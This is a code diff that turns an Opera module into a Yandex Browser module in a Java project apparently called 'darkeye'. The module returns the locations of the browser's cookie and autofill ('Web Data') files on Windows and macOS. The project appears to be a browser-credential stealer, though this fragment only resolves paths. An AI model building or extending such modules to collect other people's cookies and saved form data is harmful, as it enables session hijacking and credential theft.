@@ -1,23 +1,19 @@
 package org.spray.darkeye.module.browsers;
 
-import java.io.File;
-
 import org.spray.darkeye.module.BrowserModule;
 import org.spray.darkeye.utils.OSTools;
 
-public class OperaBrowser extends BrowserModule {
+public class YandexBrowser extends BrowserModule {
 
-	private String[] operaVersions = new String[] { "Opera Stable", "Opera GX Stable" };
-
-	public OperaBrowser() {
-		super("Opera");
+	public YandexBrowser() {
+		super("Yandex");
 	}
 
 	@Override
 	public String getCookie() {
 		return getFolder() + "/Cookies";
 	}
-
+	
 	@Override
 	public String getAutoFill() {
 		String data = OSTools.isOSLinux() ? "Web\\ Data" : "Web Data";
@@ -33,28 +29,16 @@ public class OperaBrowser extends BrowserModule {
 		String folder = "";
 		switch (OSTools.getType()) {
 		case Windows:
-			folder = getOpera(System.getenv("APPDATA") + "/Opera Software/");
+			folder = System.getenv("APPDATA") + "/Local/Yandex/YandexBrowser/User Data/Default";
 			break;
 		case MacOS:
-			folder = "/Library/Application Support/com.operasoftware.Opera";
+			folder = "/Library/Application Support/Yandex/YandexBrowser/Default";
 			break;
 		case Linux:
-			// ???
 			break;
 		default:
 			break;
 		}
 		return folder;
-	}
-
-	private String getOpera(String path) {
-		String opera = "";
-		for (String version : operaVersions) {
-			File operaPath = new File(path, version);
-			if (operaPath.exists()) {
-				opera = operaPath.getAbsolutePath();
-			}
-		}
-		return opera;
 	}
 }
